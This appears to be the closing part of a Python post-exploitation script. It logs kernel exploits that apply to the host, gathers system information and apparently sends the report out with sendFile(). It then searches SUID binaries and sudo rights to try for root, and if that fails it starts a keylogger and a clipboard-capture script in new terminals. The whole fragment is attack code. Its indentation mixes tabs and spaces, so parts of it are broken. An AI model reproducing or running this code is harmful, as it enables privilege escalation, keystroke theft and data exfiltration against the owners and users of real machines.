appendToFile("\n")

appendToFile("    The following exploits are applicable to this kernel version and should be investigated as well")
for exploit in avgprob:
	appendToFile("    - " + exploit)

sysInfo = execCmd(sysInfo)
printResults(sysInfo)
appendToFile(bigline)
appendToFile("\nFinished")
appendToFile(bigline)
sendFile()
print("Finished")
# fileVerification()

listes =  findSUID()
x=formatList(listes)
privescalation (x)
if root == False :
	sudoprivescalation()
if root == False:
	print("now execution of the keylogger")
	print("copy_paste.py script")
        subprocess.Popen("lxterminal -e python3 copy_paste.py", shell=True)
	print("key_press.py script")
        subprocess.Popen("lxterminal -e python3 key_press.py", shell=True)
	helpNeeded()
